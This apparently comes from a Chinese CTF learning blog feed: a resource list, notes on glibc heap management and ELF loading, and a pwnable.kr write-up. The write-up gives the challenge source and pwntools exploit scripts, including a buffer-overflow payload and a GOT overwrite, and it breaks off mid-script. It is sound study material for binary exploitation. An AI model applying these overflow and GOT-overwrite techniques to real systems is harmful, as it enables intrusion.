i春秋论坛上比较好的栈和格式化字符串的学习资料，配有课后习题，个人感觉质量比较好 （在左上角的搜索框里输入pwn入门就会出现10篇教程，一篇一篇看即可） 看雪知识库 CTF-All-IN-ONE (一本即将出版的西电师傅写的ctf书，（我不知道为什么里面大部分都是pwn的内容），题目都是大型比赛的题，质量比较高) 一个pwn的项目收集，里面有很多工具和题目以及wp收集 一个ctf项目 在i春秋上搜pwn的网课，有一个Atum师傅的课，里面有不少资料和学习方法，推荐去看。 其实最好的学习方式就是自己耐下心来谷歌。。。 一些博客： 台湾的angleboy，里面很多技术的原理讲的很详细，强烈安利 不认识这位师傅，但是他很多文章写得很好 深入理解计算机系统浓缩总结 FlappyPig team的Swing师傅 vidar team的veritas501师傅 sakura师傅 fb战队的ios师傅 川大windows内核大佬wjllz 川大校队hpasserby师傅 天枢-P1umer 天枢-p4nda 天枢-sunichi 天枢-e3pem 天枢-ama2in9 菜鸡-xiaoxiaorenwu 刷题： 2018比赛题目收集 ctf-wiki里的题目 pwnable.kr pwnable.tw Jarvis oj xctf社区_攻防世界 ctf-all-in-one里收集的各大比赛的题目。 其他网站： shellcode收集站1 shellcode收集站2 libc数据库搜索 一个类似ctf-wiki的项目 （里面有很多我没提到的比较偏门的刷题网站） 还有很多小的资料都是在以上列举的这些大资料里的，就不一一列举。 （希望再过多年以后还能凭着自己内心的热爱为安全事业贡献一份力。。]]></content>
      <categories>
        <category>PWN基础</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[堆的理论知识学习]]></title>
    <url>%2F2019%2F02%2F13%2F%E5%A0%86%E7%9A%84%E7%90%86%E8%AE%BA%E7%9F%A5%E8%AF%86%E5%AD%A6%E4%B9%A0%2F</url>
    <content type="text"><![CDATA[最近花了两天时间上网查阅资料学习了堆的内存管理模式，找到了几篇还不错的文章，在此分享一下： Linux堆内存管理深入分析上 Linux堆内存管理深入分析下 PWN之堆内存管理 申请内存块 看雪的求助 较详细的内存分配过程 Glibc 内存管理 Ptmalloc2 源代码分析 华庭（庄明强） (经典，较长但较详细，可自己上网找) 这几篇文章讲的已经比较详细，基础的东西我就不再赘述，只是总结一下我自己的一些心得和理解： 所谓堆的内存管理模式看起来比较复杂，主要原因是知识点较多，引入新的结构体和新函数比较多，让人一下子不能理解地那么深，或者说记忆不了那么多，耐心多看几遍就会好很多，需要一定的时间沉淀。 主要内容有三点： 一是几种结构体的介绍：malloc_state， malloc_chunk，heap_info，和chunk的结构 ||| fast_bins，small_bins，large_bins，unsorted_bin。 二是arena的介绍，多线程堆是如何管理的，malloc中mmap和brk的区别，main_arena和thread_arena的区别。（这一点在第一篇文章有详细介绍） 三是内存的分配与回收（最后一篇文章较详细），这一点最难也最重要，又全部围绕怎么让这个过程变得高效来设计（主要在于large chunk的分配需要进行碎片合并和整理的大循环）： 当malloc(size)的时候，先进行一部分处理和加锁后，开始正式分配，先看size的大小，如果在fast_bins之内，就先遍历fast_bins中有没有正好适合的chunk有的话分配后返回，没有的话或者size的大小大于64bytes小于512sizes则进入small_bins寻找，找到合适的返回，没有的话或者size大小大于512bytes属于large chunk，大循环开始，开始对fast_bins里的碎片开始整理和合并，物理地址相连的chunk合并以后放进unsorted_bin里，不能合并的直接放进unsorted_bins里，然后对unsorted_bin中的chunk从其尾指针指向的chunk开始（FIFO算法）进行遍历，if(大小刚好符合) {取出分配返回} else {将其放入对应的bin中，这个过程结束会将fast_bins和unsorted_bins清空}，遍历完成后再看last remainder chunk，其大小大于size时切割然后unsorted_bin的尾指针指向新的last remainder chunk，并更新储存其数据内容的结构。。。。 内容太多，直接看最后一篇文章吧QAQ。 orz]]></content>
      <categories>
        <category>PWN基础</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[二进制基础知识积累]]></title>
    <url>%2F2019%2F01%2F28%2F%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E7%A7%AF%E7%B4%AF%2F</url>
    <content type="text"><![CDATA[PIE和ASLR：参考链接：对PIE和ASLR的理解 首先，ASLR的是操作系统的功能选项，作用于executable（ELF）装入内存运行时，因而只能随机化stack、heap、libraries的基址；而PIE（Position Independent Executables）是编译器（gcc，..）功能选项（-fPIE），作用于excutable编译过程，可将其理解为特殊的PIC（so专用，Position Independent Code），加了PIE选项编译出来的ELF用file命令查看会显示其为so，其随机化了ELF装载内存的基址（代码段、plt、got、data等共同的基址）。 PIE只是在编译的过程中赋予了ELF加载到内存时其加载基址随机化的功能，也就是说PIE编译出来的ELF如果在ASLR=0的情况下，ELF的加载基址也是不会变的。 所以这是ASLR 的三个级别变成了 ：0， 不开启任何随机化；1， 开启stack、libraries [、executable base（special libraries -^-） if PIE is enabled while compiling] 的随机化；2，开启heap随机化。 因而，我们会发现PIE编译出来的executable如果ASLR=0的话，基址也是不会变的（有能力但没使用），如果ASLR=1的话，即使按照ASLR定义这个级别似乎不会对heap基址随机化，但是由于executable的基址已经随机化了，所以heap的基址自然也就被随机化了：） ELF文件的结构：参考链接：参考 elf文件分三种类型： 1、目标文件（通常是.o); 2、可执行文件(我们的运行文件) 3、动态库(.so) ​ 我们先讲一下可执行文件。 ​ 可执行文件一般分成4个部分，能扩展，我们理解这4部分就够了。 ​ 1. elf文件头 ，这个文件是对elf文件整体信息的描述，在32位系统下是56的字节，在64位系统下是64个字节。 对于可执行文件来说，文件头包含的一下信息与进程启动相关 e_entry 程序入口地址 e_phoff segment偏移 e_phnum segment数量 ​ 2. segment表， 这个表是加载指示器，操作系统（确切的说是加载器，有些elf文件，比如操作系统内核，是由其他程序加载的）,该表的结构非常重要。 typedef struct { Elf64_Word p_type; / Segment type / Elf64_Word p_flags; / Segment flags / /*segment权限，6表示可读写，5表示可读可执行 Elf64_Off p_offset; / Segment file offset / /段在文件中的偏移/ Elf64_Addr p_vaddr; / Segment virtual address / /*虚拟内存地址，这个表示内存中的 Elf64_Addr p_paddr; / Segment physical address /物理内存地址，对应用程序来说，这个字段无用*/ Elf64_Xword p_filesz; / Segment size in file / /段在文件中的长度/ Elf64_Xword p_memsz; / Segment size in memory / /在内存中的长度，一般和p_filesz的值一样*/ Elf64_Xword p_align; / Segment alignment / / 段对齐/ } Elf64_Phdr; ​ 3. elf的主题，对于可执行文件来说，最主要的就是数据段和代码段 ​ 4. section表，对可执行文件来说，没有用，在链接的时候有用，是对代码段数据段在链接是的一种描述。 ​ 整个elf文件的组成可以使用下图来描述: ELF文件的载入和运行及动态链接：参考链接:重读《深入理解计算机系统》 运行地址也就是链接地址。实际上指的是，程序在运行过程中，该指令对应的内存地址。 我们再回到本系列的主题：程序的加载和运行。可执行程序生成之后，是保存在硬盘中的，当用户执行该程序的时候，该程序会被加载器按照program header table的描述将程序的代码段和数据段从硬盘加载到内存中。在使用MMU的机器上，CPU处理的地址是虚拟地址。同样的，加载到内存中的地址指的也是虚拟地址。由于虚拟内存的抽象，每个进程都认为其独占内存，因此，每个可执行程序总是可以被加载到相同的内存地址（虚拟地址），其实，这些内存地址都是位于各个可执行程序独自的内存空间的地址。但是，对于MMU来讲，这些相同的虚拟地址其实对应了不同的物理地址。而对于CPU来讲，指令是按照其虚拟地址一条条的被加载到CPU中运行的。 如上所述，加载器是按照program header table的描述来给程序代码段分配指令地址的。具体的过程如下： 还记得我们在可执行文件详解中segment和section的对应关系吧？每个section按照这个mapping表顺序排列构成了不同的segment。其中第2个segment就是可执行文件的代码段。代码段中第一个section是.interp，其起始地址是0x400238，然后，加上.interp section的大小，就是下一个section .note.ABI-tag的起始地址。依次类推，对于可执行文件详解中的可执行文件add来讲，其.text的起始地址就是0x400430。 为什么对于X86_64架构来讲，所有可执行文件的text segment的起始地址都是0x400000? 实际上是链接脚本规定的，在链接过程中，链接器会根据链接脚本的描述来构建可执行文件。对于X86_64来讲，其默认的链接脚本位于/usr/lib/ldscripts/elf_x86_64.x。在其中我们发现这句话：__executable_start = SEGMENT_START(&quot;text-segment&quot;, 0x400000))它指定了可执行的text segment应起始于0x400000。 根据上述objdump -d的输出，.text的第一个函数是_start，因此，_start的第一条指令地址就是0x400430。后面每个函数的地址等于它的上一个函数的地址加上该函数自身的字节数。这样，完成了给每个函数重定位（分配运行地址）的过程。 函数中的每条指令的地址的重定位类似于函数重定位。函数的首地址即是第一条指令的首地址，后面每条指令的地址依次等于上一条指令的地址加上该指令的字节数。回忆编译过程分析中，在编译完成后，指令引用外部符号时，生成了对应的操作数和符号的占位符，此时，对于除动态链接库的符号外，其他的符号都已经有了确定的地址。因此，结合符号表我们就可以将类似的指令完成重定位。 比如在本例中，对于main函数来讲，调用了两个外部函数add和printf，根据上面信息，add函数相关的代码已经确定在0x400526处。因此，该地址就是call指令的调用add的操作数。而上述代码显示的400400处似乎并非是printf函数真正的实现。没错，这是因为printf函数是属于libc的库函数，但是，我们知道对于动态链接来讲，在生成可执行文件时，并未将它所依赖的动态库的代码复制过来，而只是复制了相关的重定位信息和符号表，所以，此时依然不能确定printf函数的地址。而400400处的内存值只是一个跳板，等程序运行时，动态链接器会将相关动态链接库的代码链接进来，修改这个跳板处对应的值，就可以让跳转指令正确的跳转到printf函数真正的内存地址处执行了。稍后我们将会对该过程做详细的分析。（涉及到PLT和GOT表的知识） 上篇文章我们提到，为了保证代码复用和节省计算机资源，在链接时，动态链接库的代码段和数据段等是不会被复制到最终生成的可执行文件中的，这些部分会在程序加载的时候复制到内存，并做动态链接，使原来可执行文件能够对其中定义的符号正常引用。也就是说在这个时候，可执行文件代码段中对动态链接库包含的符号引用的地址才真正确定下来。但是我们查看各个segment的属性可以知道，.text segment是只读的，也就是说在编译成可以执行文件之后，就不能被修改了，那么如何确保它能够正确的引用在加载时才能确定下来的动态链接库里的符号呢？这就需要我们这篇文章里的GOT和PLT作为跳板来实现了。 GOT全称Global Offset Table，即全局偏移量表。它在可执行文件中是一个单独的section，位于.data section的前面。每个被目标模块引用的全局符号（函数或者变量）都对应于GOT中一个8字节的条目。编译器还为GOT中每个条目生成一个重定位记录。在加载时，动态链接器会重定位GOT中的每个条目，使得它包含正确的目标地址。 PLT全称Procedure Linkage Table，即过程链接表。它在可执行文件中也是一个单独的section，位于.textsection的前面。每个被可执行程序调用的库函数都有它自己的PLT条目。每个条目实际上都是一小段可执行的代码。]]></content>
      <categories>
        <category>PWN基础</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[pwnable.kr第一部分exp与思路]]></title>
    <url>%2F2018%2F12%2F26%2Fpwnable-kr%E7%AC%AC%E4%B8%80%E9%83%A8%E5%88%86exp%E4%B8%8E%E6%80%9D%E8%B7%AF%2F</url>
    <content type="text"><![CDATA[写这些没用的东西也没啥目的，除了回忆一下知识之外也就是练一下exp的书写，因为很多题没必要用exp所以那时候做就没练过。。。。。pwnable.kr第一部分确实很适合初学者做，大多为知识题，主要是强迫你去学知识，而且后面几题建立出一个基本框架，此外搭配jarvis.oj和ctf-wiki有体系的学习更好，完成这些再去pwnable.tw。。。 fd思路：1.有源码肯定先分析源码： 123456789101112131415161718192021#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;char buf[32];int main(int argc, char* argv[], char* envp[])&#123; if(argc&lt;2)&#123; printf("pass argv[1] a number\n"); return 0; &#125; int fd = atoi( argv[1] ) - 0x1234; int len = 0; len = read(fd, buf, 32); if(!strcmp("LETMEWIN\n", buf))&#123; printf("good job :)\n"); system("/bin/cat flag"); exit(0); &#125; printf("learn about Linux file IO\n"); return 0;&#125; 2.题意简单明了：先找flag，发现当buf中装的是LETMEWIN时获得flag，回头找buf从何而来，发生了啥， read()中从fd文件符读32字节，fd即为文件操作符，只有当fd=0时我们才能通过输入控制，所以使argv[1]=&#39;0x1234&#39; 即可。 exp： 12345from pwn import * s=ssh(host='pwnable.kr',user='fd',password='guest',port=2222)p=s.process(argv=['./fd','4660'],executable='./fd')p.sendline('LETMEWIN')p.interactive() collision思路：1. 有源码看源码： 12345678910111213141516171819202122232425262728293031#include &lt;stdio.h&gt;#include &lt;string.h&gt;unsigned long hashcode = 0x21DD09EC;unsigned long check_password(const char* p)&#123; int* ip = (int*)p; int i; int res=0; for(i=0; i&lt;5; i++)&#123; res += ip[i]; &#125; return res;&#125;int main(int argc, char* argv[])&#123; if(argc&lt;2)&#123; printf("usage : %s [passcode]\n", argv[0]); return 0; &#125; if(strlen(argv[1]) != 20)&#123; printf("passcode length should be 20 bytes\n"); return 0; &#125; if(hashcode == check_password( argv[1] ))&#123; system("/bin/cat flag"); return 0; &#125; else printf("wrong passcode.\n"); return 0;&#125; 先看代码结构：有两个函数，main()和check_password()，先看main()找到关于flag的语句，当hashcode等于将第二个参数传入check_password后的返回值时，拿到flag，hashcode已给出，分析check_password()即可，​ int* ip = (int*)p; 此句为理解关键，将char类型指针强转为int型，ip每加一移动4个字节，所以题意为将输入的20个字节的参数分为5组，累加后等于0x21dd09ec即可 计算器：0x01010101 * 4 +0x1dd905e8 = 0x21dd09ec （看网上说有坏字符的影响，但这么多数，随便选一个也可以了吧。。。。） exp: 12345from pwn import * s=ssh(host='pwnable.kr',user='col',password='guest',port=2222)str=p32(0x01010101)*4 + p32(0x1dd905e8)p=s.process(argv=['./col',str],executable='./col')p.interactive() bof思路：1. 下载看源码： 123456789101112131415161718#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;void func(int key)&#123; char overflowme[32]; printf("overflow me : "); gets(overflowme); // smash me! if(key == 0xcafebabe)&#123; system("/bin/sh"); &#125; else&#123; printf("Nah..\n"); &#125;&#125;int main(int argc, char* argv[])&#123; func(0xdeadbeef); return 0;&#125; 这题是最基础的缓冲区溢出，只要对其有过一点研究的人都应该没什么问题，ctfwiki上有全面详细的剖析，推荐自学参考 ctf-wiki 看完以后再做这个绝对没有问题 很明显对含有gets()的func()进行溢出，用overflowme覆盖key，将key变成0xcafebabe exp: 12345from pwn import * s=remote('pwnable.kr',9000)payload='A'*0x34 + p32(0xcafebabe)s.sendline(payload)s.interactive() flag思路：1. 没给源码，只有elf文件，直接放进ida中，因为题目提示了This is reversing task. all you need is binary所以F5大法基本不管用了，再看其函数少的可怜（基本是加壳了），再看hex-view 机器码一行一行看时发现一句话 this file is packed with the UPX.......很明显，这题需要upx的知识储备，寻找谷歌百度 ，发现文件被Upx方式加壳，需要解壳。 先下载upx 然后在flag所在目录解壳flag,之后再把它放进ida中，看源码得知他要把flag复制进malloc()里，但是我们可以其实可以直接双击flag直接看注释得知flag…..可能是bug…. 或者在gdb里也可以直接在传递flag给rdx的指令后下个断点，然后在已字符串形式查看rdx的值即可。 passcode思路： 1. 老套路有源码看源码： 12345678910111213141516171819202122232425262728293031323334353637383940414243#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;void login()&#123; int passcode1; int passcode2; printf("enter passcode1 : "); scanf("%d", passcode1); fflush(stdin); // ha! mommy told me that 32bit is vulnerable to bruteforcing :) printf("enter passcode2 : "); scanf("%d", passcode2); printf("checking...\n"); if(passcode1==338150 &amp;&amp; passcode2==13371337)&#123; printf("Login OK!\n"); system("/bin/cat flag"); &#125; else&#123; printf("Login Failed!\n"); exit(0); &#125;&#125;void welcome()&#123; char name[100]; printf("enter you name : "); scanf("%100s", name); printf("Welcome %s!\n", name);&#125;int main()&#123; printf("Toddler's Secure Login System 1.0 beta.\n"); welcome(); login(); // something after login... printf("Now I can safely trust you that you have credential :)\n"); return 0; &#125; 这题有点小难度：（首先应注意到welcome()和login()同在main()里且之间没有多余操作，所以他们ebp应该一样。）第一个思路是直接把system()的地址放进welcome()的ret里，后来发现name虽然限制了为100，但是name偏移了70h，失败。第二个思路是看passcode1和passcode2的地址，通过welcome中的name设计数据来控制他们的值：有两个地方行不通：1.passcode1与2与name的偏移大于100 。 2.passcode1为338150（0x000582E6），passcode2为13371337（0x00cc07c9）即可，然而且不论这两个地址是否是可写的，至少00字节的存在就因为截断而打消念想了。 所以这个时候问题就变得比较操蛋，需要查资料和新的东西了，通过调试理解plt和got表 诞生一种新方法，双重scanf()连续修改，在welcome()的scanf()利用name设计passcode1（需先确定passcode1的地址相对name的偏移）的值，将其值设为fflush()的got表地址，在login()的第一个scanf()向passcode1所指向的地址（Got表中原本写的是调用flush()指令的地址）改为调用system函数指令的地址，所以之后调用fflush()的时候就会调用system（）。 exp: 123456from pwn import *s=ssh(host='pwnable.kr',port=2222,user='passcode',password='guest')p=s.process('./passcode')payload='a'* 0x60 + '\x04\xa0\x04\x08' + '134514147'p.sendline(payload)p.interactive() exp需注意的地方：应数是输入给scanf 有固定格式，不能随便输入，例如%d只能为十进制整数，将134514147换成0x080485e3则不对。 random思路：1. 有源码 123456789101112131415161718#include &lt;stdio.h&gt;int main()&#123; unsigned int random; random = rand(); // random value! unsigned int key=0; scanf("%d", &amp;key); if( (key ^ random) == 0xdeadbeef )&#123; printf("Good!\n"); system("/bin/cat flag"); return 0; &#125; printf("Wrong, maybe you should try 2^32 cases.\n"); return 0;&#125; 明显看出rand()的种子为固定的，所以其值也为固定的值，自己写一个程序跑一下就可以得出其结果，然后用公式a或b=c，则a/b=c或b/a。用计算器得出答案。 exp: 12345from pwn import * s=ssh(host='pwnable.kr',user='random',port=2222,password='guest')p=s.process('./random')p.sendline('3039230856')p.interactive() input思路：1. 有源码： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;sys/socket.h&gt;#include &lt;arpa/inet.h&gt;int main(int argc, char* argv[], char* envp[])&#123; printf("Welcome to pwnable.kr\n"); printf("Let's see if you know how to give input to program\n"); printf("Just give me correct inputs then you will get the flag :)\n"); // argv if(argc != 100) return 0; if(strcmp(argv['A'],"\x00")) return 0; if(strcmp(argv['B'],"\x20\x0a\x0d")) return 0; printf("Stage 1 clear!\n"); // stdio char buf[4]; read(0, buf, 4); if(memcmp(buf, "\x00\x0a\x00\xff", 4)) return 0; read(2, buf, 4); if(memcmp(buf, "\x00\x0a\x02\xff", 4)) return 0; printf("Stage 2 clear!\n"); // env if(strcmp("\xca\xfe\xba\xbe", getenv("\xde\xad\xbe\xef"))) return 0; printf("Stage 3 clear!\n"); // file FILE* fp = fopen("\x0a", "r"); if(!fp) return 0; if( fread(buf, 4, 1, fp)!=1 ) return 0; if( memcmp(buf, "\x00\x00\x00\x00", 4) ) return 0; fclose(fp); printf("Stage 4 clear!\n"); // network int sd, cd; struct sockaddr_in saddr, caddr; sd = socket(AF_INET, SOCK_STREAM, 0); if(sd == -1)&#123; printf("socket error, tell admin\n"); return 0; &#125; saddr.sin_family = AF_INET; saddr.sin_addr.s_addr = INADDR_ANY; saddr.sin_port = htons( atoi(argv['C']) ); if(bind(sd, (struct sockaddr*)&amp;saddr, sizeof(saddr)) &lt; 0)&#123; printf("bind error, use another port\n"); return 1; &#125; listen(sd, 1); int c = sizeof(struct sockaddr_in); cd = accept(sd, (struct sockaddr *)&amp;caddr, (socklen_t*)&amp;c); if(cd &lt; 0)&#123; printf("accept error, tell admin\n"); return 0; &#125; if( recv(cd, buf, 4, 0) != 4 ) return 0; if(memcmp(buf, "\xde\xad\xbe\xef", 4)) return 0; printf("Stage 5 clear!\n"); // here's your flag system("/bin/cat flag"); return 0;&#125; 这题需要一些知识储备，包括socket通信，管道通信，环境变量的理解和简单运用，需要耐心一个一个知识点学习。 code: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/socket.h&gt;#include &lt;netinet/in.h&gt;#include &lt;netdb.h&gt; void main()&#123; char *args[101]; int i; for(i=0;i&lt;100;i++)&#123; args[i]="A"; &#125; args['A']="\x00"; args['B']="\x20\x0a\x0d"; args['C']="5555"; args[100]=NULL; char* env[2]=&#123;"\xde\xad\xbe\xef=\xca\xfe\xba\xbe",NULL&#125;; int fd0[2]; int fd2[2]; pipe(fd0); pipe(fd2); FILE* fp = fopen("\x0a", "ab+"); fwrite("\x00\x00\x00\x00", 4, 1, fp); #define CHILD_READ0 fd0[0] #define PARENT_WRITE0 fd0[1] #define CHILD_READ2 fd2[0] #define PARENT_WRITE2 fd2[1] pid_t child; if((child=fork())&lt;0)&#123; printf("Error\n"); &#125;else if(child==0)&#123; close(PARENT_WRITE0); close(PARENT_WRITE2); dup2(CHILD_READ0,0); dup2(CHILD_READ2,2); close(CHILD_READ0); close(CHILD_READ2); execve("/home/input/input",args,env); &#125;else&#123; close(CHILD_READ0); close(CHILD_READ2); write(PARENT_WRITE0,"\x00\x0a\x00\xff",4); write(PARENT_WRITE2,"\x00\x0a\x02\xff",4); int sockfd, portno, n; struct sockaddr_in serv_addr; struct hostent *server; portno = atoi(args['C']); sockfd = socket(AF_INET, SOCK_STREAM, 0); server = gethostbyname("127.0.0.1"); bzero((char *) &amp;serv_addr, sizeof(serv_addr)); serv_addr.sin_family = AF_INET; bcopy((char *)server-&gt;h_addr, (char *)&amp;serv_addr.sin_addr.s_addr, server-&gt;h_length); serv_addr.sin_port = htons(portno); sleep(5); connect(sockfd,(struct sockaddr *) &amp;serv_addr,sizeof(serv_addr)); write(sockfd,"\xde\xad\xbe\xef",4); close(sockfd); &#125;&#125; leg思路: 1. 有源码，也给了汇编码，知识题（学习arm汇编知识）： 1234567891011121314151617181920212223242526272829303132333435363738#include &lt;stdio.h&gt;#include &lt;fcntl.h&gt;int key1()&#123; asm("mov r3, pc\n");&#125;int key2()&#123; asm( "push &#123;r6&#125;\n" "add r6, pc, $1\n" "bx r6\n" ".code 16\n" "mov r3, pc\n" "add r3, $0x4\n" "push &#123;r3&#125;\n" "pop &#123;pc&#125;\n" ".code 32\n" "pop &#123;r6&#125;\n" );&#125;int key3()&#123; asm("mov r3, lr\n");&#125;int main()&#123; int key=0; printf("Daddy has very strong arm! : "); scanf("%d", &amp;key); if( (key1()+key2()+key3()) == key )&#123; printf("Congratz!\n"); int fd = open("flag", O_RDONLY); char buf[100]; int r = read(fd, buf, 100); write(0, buf, r); &#125; else&#123; printf("I have strong leg :P\n"); &#125; return 0;&#125; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879(gdb) disass mainDump of assembler code for function main: 0x00008d3c &lt;+0&gt;: push &#123;r4, r11, lr&#125; 0x00008d40 &lt;+4&gt;: add r11, sp, #8 0x00008d44 &lt;+8&gt;: sub sp, sp, #12 0x00008d48 &lt;+12&gt;: mov r3, #0 0x00008d4c &lt;+16&gt;: str r3, [r11, #-16] 0x00008d50 &lt;+20&gt;: ldr r0, [pc, #104] ; 0x8dc0 &lt;main+132&gt; 0x00008d54 &lt;+24&gt;: bl 0xfb6c &lt;printf&gt; 0x00008d58 &lt;+28&gt;: sub r3, r11, #16 0x00008d5c &lt;+32&gt;: ldr r0, [pc, #96] ; 0x8dc4 &lt;main+136&gt; 0x00008d60 &lt;+36&gt;: mov r1, r3 0x00008d64 &lt;+40&gt;: bl 0xfbd8 &lt;__isoc99_scanf&gt; 0x00008d68 &lt;+44&gt;: bl 0x8cd4 &lt;key1&gt; 0x00008d6c &lt;+48&gt;: mov r4, r0 0x00008d70 &lt;+52&gt;: bl 0x8cf0 &lt;key2&gt; 0x00008d74 &lt;+56&gt;: mov r3, r0 0x00008d78 &lt;+60&gt;: add r4, r4, r3 0x00008d7c &lt;+64&gt;: bl 0x8d20 &lt;key3&gt; 0x00008d80 &lt;+68&gt;: mov r3, r0 0x00008d84 &lt;+72&gt;: add r2, r4, r3 0x00008d88 &lt;+76&gt;: ldr r3, [r11, #-16] 0x00008d8c &lt;+80&gt;: cmp r2, r3 0x00008d90 &lt;+84&gt;: bne 0x8da8 &lt;main+108&gt; 0x00008d94 &lt;+88&gt;: ldr r0, [pc, #44] ; 0x8dc8 &lt;main+140&gt; 0x00008d98 &lt;+92&gt;: bl 0x1050c &lt;puts&gt; 0x00008d9c &lt;+96&gt;: ldr r0, [pc, #40] ; 0x8dcc &lt;main+144&gt; 0x00008da0 &lt;+100&gt;: bl 0xf89c &lt;system&gt; 0x00008da4 &lt;+104&gt;: b 0x8db0 &lt;main+116&gt; 0x00008da8 &lt;+108&gt;: ldr r0, [pc, #32] ; 0x8dd0 &lt;main+148&gt; 0x00008dac &lt;+112&gt;: bl 0x1050c &lt;puts&gt; 0x00008db0 &lt;+116&gt;: mov r3, #0 0x00008db4 &lt;+120&gt;: mov r0, r3 0x00008db8 &lt;+124&gt;: sub sp, r11, #8 0x00008dbc &lt;+128&gt;: pop &#123;r4, r11, pc&#125; 0x00008dc0 &lt;+132&gt;: andeq r10, r6, r12, lsl #9 0x00008dc4 &lt;+136&gt;: andeq r10, r6, r12, lsr #9 0x00008dc8 &lt;+140&gt;: ; &lt;UNDEFINED&gt; instruction: 0x0006a4b0 0x00008dcc &lt;+144&gt;: ; &lt;UNDEFINED&gt; instruction: 0x0006a4bc 0x00008dd0 &lt;+148&gt;: andeq r10, r6, r4, asr #9End of assembler dump.(gdb) disass key1Dump of assembler code for function key1: 0x00008cd4 &lt;+0&gt;: push &#123;r11&#125; ; (str r11, [sp, #-4]!) 0x00008cd8 &lt;+4&gt;: add r11, sp, #0 0x00008cdc &lt;+8&gt;: mov r3, pc 0x00008ce0 &lt;+12&gt;: mov r0, r3 0x00008ce4 &lt;+16&gt;: sub sp, r11, #0 0x00008ce8 &lt;+20&gt;: pop &#123;r11&#125; ; (ldr r11, [sp], #4) 0x00008cec &lt;+24&gt;: bx lrEnd of assembler dump.(gdb) disass key2Dump of assembler code for function key2: 0x00008cf0 &lt;+0&gt;: push &#123;r11&#125; ; (str r11, [sp, #-4]!) 0x00008cf4 &lt;+4&gt;: add r11, sp, #0 0x00008cf8 &lt;+8&gt;: push &#123;r6&#125; ; (str r6, [sp, #-4]!) 0x00008cfc &lt;+12&gt;: add r6, pc, #1 0x00008d00 &lt;+16&gt;: bx r6 0x00008d04 &lt;+20&gt;: mov r3, pc 0x00008d06 &lt;+22&gt;: adds r3, #4 0x00008d08 &lt;+24&gt;: push &#123;r3&#125; 0x00008d0a &lt;+26&gt;: pop &#123;pc&#125; 0x00008d0c &lt;+28&gt;: pop &#123;r6&#125; ; (ldr r6, [sp], #4) 0x00008d10 &lt;+32&gt;: mov r0, r3 0x00008d14 &lt;+36&gt;: sub sp, r11, #0 0x00008d18 &lt;+40&gt;: pop &#123;r11&#125; ; (ldr r11, [sp], #4) 0x00008d1c &lt;+44&gt;: bx lrEnd of assembler dump.(gdb) disass key3Dump of assembler code for function key3: 0x00008d20 &lt;+0&gt;: push &#123;r11&#125; ; (str r11, [sp, #-4]!) 0x00008d24 &lt;+4&gt;: add r11, sp, #0 0x00008d28 &lt;+8&gt;: mov r3, lr 0x00008d2c &lt;+12&gt;: mov r0, r3 0x00008d30 &lt;+16&gt;: sub sp, r11, #0 0x00008d34 &lt;+20&gt;: pop &#123;r11&#125; ; (ldr r11, [sp], #4) 0x00008d38 &lt;+24&gt;: bx lrEnd of assembler dump.(gdb) 易得题意为计算key1,key2,key3的值，然后输入他们的和即可。学习知识参考以下两个链接：arm速成 跳转指令基本用法 mistake思路：1. 有源码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950#include &lt;stdio.h&gt;#include &lt;fcntl.h&gt;#define PW_LEN 10#define XORKEY 1void xor(char* s, int len)&#123; int i; for(i=0; i&lt;len; i++)&#123; s[i] ^= XORKEY; &#125;&#125;int main(int argc, char* argv[])&#123; int fd; if(fd=open("/home/mistake/password",O_RDONLY,0400) &lt; 0)&#123; printf("can't open password %d\n", fd); return 0; &#125; printf("do not bruteforce...\n"); sleep(time(0)%20); char pw_buf[PW_LEN+1]; int len; if(!(len=read(fd,pw_buf,PW_LEN) &gt; 0))&#123; printf("read error\n"); close(fd); return 0; &#125; char pw_buf2[PW_LEN+1]; printf("input password : "); scanf("%10s", pw_buf2); // xor your input xor(pw_buf2, 10); if(!strncmp(pw_buf, pw_buf2, PW_LEN))&#123; printf("Password OK\n"); system("/bin/cat flag\n"); &#125; else&#123; printf("Wrong Password\n"); &#125; close(fd); return 0;&#125; 额，这题比较坑，要不是有hint也不知道能不能做出来。。。。。有hint就很简单了。。。。不说了吧 shellshock思路：1. 有源码： 1234567#include &lt;stdio.h&gt;int main()&#123; setresuid(getegid(), getegid(), getegid()); setresgid(getegid(), getegid(), getegid()); system("/home/shellshock/bash -c 'echo shock_me'"); return 0;&#125; 根据提示和源码较为简单，猜是一道知识题 shellshock知识参考 需要注意的一点是执行cat flag时要改成 /bin/cat flag 因为sh的环境变量中未必有/bin，所以cat命令不一定能找到，最好用绝对路径。 coin1(借鉴别人的，不想写了。。)exp: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768# coding: utf-8import socketimport randomimport timeimport reimport stringdef getweight(start, end): str_ask = [str(n) for n in range(start, end)] str_ask = " ".join(str_ask) client.send(bytes(str_ask+"\n")) str_weight = client.recv(10) str(str_weight).split("\n") weight = int(str_weight) return weightHOST = ('0.0.0.0')PORT = 9007client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)client.connect((HOST, PORT))data = client.recv(1024)time.sleep(4)for i in range(100): recv_data = str(client.recv(2048)) position_of_number = (recv_data.find('N=')) position_of_chance = (recv_data.find('C=')) number = 0 chance = 0 for k in range(10): if str(recv_data[position_of_number + 2 + k]) &lt;= '9' and str(recv_data[position_of_number + 2 + k]) &gt;= '0': number = int(recv_data[position_of_number + 2 + k]) + number * 10 k += 1 else: break for k in range(100): if str(recv_data[position_of_chance + 2 + k]) &lt;= '9' and str(recv_data[position_of_chance + 2 + k]) &gt;= '0': chance = int(recv_data[position_of_chance + 2 + k]) + chance 